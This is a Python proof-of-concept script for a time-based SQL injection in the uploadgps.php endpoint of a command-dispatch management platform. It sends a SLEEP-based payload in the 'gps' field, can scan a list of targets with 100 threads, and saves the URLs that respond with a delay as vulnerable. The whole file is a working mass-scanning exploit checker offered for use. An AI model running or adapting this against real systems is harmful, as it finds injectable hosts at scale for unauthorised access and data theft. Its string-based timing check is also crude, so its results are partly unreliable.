#指挥调度管理平台uploadgps.php存在SQL注入
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    test = """
 
  ____   ___  _       _        _           _   _             
 / ___| / _ \| |     (_)_ __  (_) ___  ___| |_(_) ___  _ __  
 \___ \| | | | |     | | '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
  ___) | |_| | |___  | | | | || |  __/ (__| |_| | (_) | | | |
 |____/ \__\_\_____| |_|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
                            |__/                             
                                                        version:ZHDD_uploadgps_SleepSql 1.0.0
                                                        Author: Laow🚦                                       
"""
    print(test)

def main():
    banner() 
    parser = argparse.ArgumentParser(description="指挥调度管理平台uploadgps.php存在SQL注入")
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/api/client/task/uploadgps.php'
    url = target+url_payload
    headers = {
        "Pragma": "no-cache", 
        "Cache-Control": "no-cache", 
        "Upgrade-Insecure-Requests": "1", 
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7", 
        "Accept-Encoding": "gzip, deflate", 
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", 
        "Connection": "close", 
        "Content-Type": "application/x-www-form-urlencoded"
        }
    data = {"uuid": '', "gps": "1' AND (SELECT 7679 FROM (SELECT(SLEEP(4)))ozYR) AND 'fqDZ'='fqDZ", "number": ''}
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res = requests.post(url=url,headers=headers,data=data,proxies=proxies,verify=False)
        time = str(res.elapsed.total_seconds())[0]
        # print(time)
        if res.status_code == 200:
            if '3' < time <'5':
                print(f"{GREEN}[+] {url} 存在sql延时注入漏洞！{RESET}")
                with open('result.txt','a') as f:
                    f.write(target+'\n')
            else:
                print('漏洞不存在!!')
    except Exception:
        pass
        

if __name__ == '__main__': # 主函数的入口
    main() # 入口 mian()
